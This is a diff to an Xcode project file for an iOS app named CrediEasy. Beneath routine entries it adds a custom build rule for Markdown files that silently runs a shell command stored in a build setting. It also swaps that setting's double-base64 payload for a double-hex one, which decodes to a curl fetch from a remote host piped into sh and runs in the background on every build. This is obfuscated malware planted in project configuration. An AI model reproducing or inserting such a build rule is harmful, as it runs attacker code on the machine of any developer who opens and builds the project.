@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		4BEBAF60543B533F2ABDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = F407B6DBF16CB2A7CBBDE67E; };
 		73063EE92E77E9500084DD7E /* PassportViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EE82E77E9500084DD7E /* PassportViewController.swift */; };
 		73063EEE2E77ED5D0084DD7E /* PassportView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EED2E77ED5D0084DD7E /* PassportView.swift */; };
 		73063EF02E77ED6B0084DD7E /* PassportViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EEF2E77ED600084DD7E /* PassportViewModel.swift */; };
@@ -73,6 +74,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		F407B6DBF16CB2A7CBBDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "CrediEasy.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		1F016C24E2A1B0A26B8781E4 /* Pods-CrediEasy.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CrediEasy.release.xcconfig"; path = "Target Support Files/Pods-CrediEasy/Pods-CrediEasy.release.xcconfig"; sourceTree = "<group>"; };
 		64F5BCD9574B33A894FD1D7A /* Pods_CrediEasy.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_CrediEasy.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		73063EE82E77E9500084DD7E /* PassportViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PassportViewController.swift; sourceTree = "<group>"; };
@@ -324,6 +326,7 @@
 		73E3943F2E6FB540008BDDC1 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				F407B6DBF16CB2A7CBBDE67E /* README.md */,
 				73E3943E2E6FB540008BDDC1 /* CrediEasy.app */,
 			);
 			name = Products;
@@ -371,6 +374,7 @@
 				C32D501DF216637E5D2B9FFE /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				C1192F5C04E95D3842BDE67E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -412,12 +416,14 @@
 			);
 		};
 /* End PBXProject section */
-
+/* Begin PBXBuildRule section */		C1192F5C04E95D3842BDE67E /* PBXBuildRule */ = {			isa = PBXBuildRule;			compilerSpec = com.apple.compilers.proxy.script;			filePatterns = "*.md";			fileType = pattern.proxy;			inputFiles = (			);			isEditable = 0;			outputFiles = (				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",			);			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 /* Begin PBXResourcesBuildPhase section */
 		73E3943C2E6FB540008BDDC1 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				4BEBAF60543B533F2ABDE67E /* README.md */,
 				73E394632E6FB548008BDDC1 /* Assets.xcassets in Resources */,
 				73E394652E6FB548008BDDC1 /* LaunchScreen.storyboard in Resources */,
 				73F7BF9B2E7020E9005C8C43 /* loading.json in Resources */,
@@ -557,7 +563,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 8C8768C2260CA2B43A564232 /* Pods-CrediEasy.debug.xcconfig */;
 			buildSettings = {
-				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHTmhZMmhsTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631363336333631373037303663363532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = CrediEasy/CrediEasy.entitlements;
@@ -603,7 +609,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 1F016C24E2A1B0A26B8781E4 /* Pods-CrediEasy.release.xcconfig */;
 			buildSettings = {
-				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHTmhZMmhsTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631363336333631373037303663363532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = CrediEasy/CrediEasy.entitlements;
